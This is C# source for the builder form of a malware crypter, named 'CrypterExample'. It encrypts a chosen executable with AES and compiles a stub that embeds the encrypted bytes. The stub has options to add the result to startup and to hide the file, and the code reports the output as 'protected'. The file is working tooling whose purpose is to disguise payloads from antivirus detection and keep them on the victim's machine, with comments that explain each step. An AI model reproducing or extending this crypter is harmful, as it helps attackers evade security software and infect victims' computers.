using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Resources;
using Microsoft.Win32;


namespace CrypterExample
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox1.Text = FOpen.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Icon Files|*.ico",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox2.Text = FOpen.FileName;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox3.Text = RandomString(25);
        }

        private string RandomString(int length)
        {
            string pool = "abcdefghijklmnopqrstuvwxyz";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            SaveFileDialog FSave = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            if (FSave.ShowDialog() == DialogResult.OK)
            {
                // We read the source of the stub from the resources
                // and we're storing it into a variable.
                string Source = Properties.Resources.Stub;

                // If the user picked a storage method (he obviously did)
                // then replace the value on the source of the stub
                // that will later tell the stub from where it should
                // read the bytes.
                if (radioButton1.Checked)
                    // User picked native resources method.
                    Source = Source.Replace("[storage-replace]", "native");
                else
                    // User picked managed resources method.
                    Source = Source.Replace("[storage-replace]", "managed");

                // Check to see if the user enabled startup
                // and replace the boolean value in the stub
                // which indicates if the crypted file should
                // add itself to startup
                if (checkBox1.Checked)
                    // User enabled startup.
                    Source = Source.Replace("[startup-replace]", "true");
                else
                    // User did not enable startup.
                    Source = Source.Replace("[startup-replace]", "false");

                // Check to see if the user enabled hide file
                // and replace the boolean value in the stub
                // which indicates if the crypted file should hide itself
                if (checkBox2.Checked)
                    // User enabled hide file.
                    Source = Source.Replace("[hide-replace]", "true");
                else
                    // User did not enable hide file.
                    Source = Source.Replace("[hide-replace]", "false");

                // Replace the encryption key in the stub
                // as it will be used by it in order to
                // decrypt the encrypted file.
                Source = Source.Replace("[key-replace]", textBox3.Text);

                // Read the bytes of the file the user wants to crypt.
                byte[] FileBytes = File.ReadAllBytes(textBox1.Text);

                // Encrypt the file using the AES encryption algorithm.
                // The key is the random string the user generated.
                byte[] EncryptedBytes = Encryption.AESEncrypt(FileBytes, textBox3.Text);


                //File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/source.txt", Source);

                // Compile the file according to the storage method the user picked.
                // We also declare a variable to store the result of the compilation.
                bool success;
                if (radioButton1.Checked) /* User picked native resources method */
                {
                    // Check if the user picked an icon file and if it exists.
                    if (File.Exists(textBox2.Text))
                        // Compile with an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text);
                    else
                        // Compile without an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName);

                    Writer.WriteResource(FSave.FileName, EncryptedBytes);
                }
                else
                {
                    // The user picked the managed resource method so we'll create
                    // a resource file that will contain the bytes. Then we will
                    // compile the stub and add that resource file to the compiled
                    // stub.
                    string ResFile = Path.Combine(Application.StartupPath, "Encrypted.resources");
                    using (ResourceWriter Writer = new ResourceWriter(ResFile))
                    {
                        // Add the encrypted bytes to the resource file.
                        Writer.AddResource("encfile", EncryptedBytes);
                        // Generate the resource file.
                        Writer.Generate();
                    }

                    // Check if the user picked an icon file and if it exists.
                    if (File.Exists(textBox2.Text))
                        // Compile with an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, textBox2.Text, new string[] { ResFile });
                    else
                        // Compile without an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, null, new string[] { ResFile });
                
                    // Now that the stub was compiled, we delete
                    // the resource file since we don't need it anymore.
                    File.Delete(ResFile);
                }
                if (success)
                {
                    MessageBox.Show("Your file has been successfully protected.",
                        "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }
}
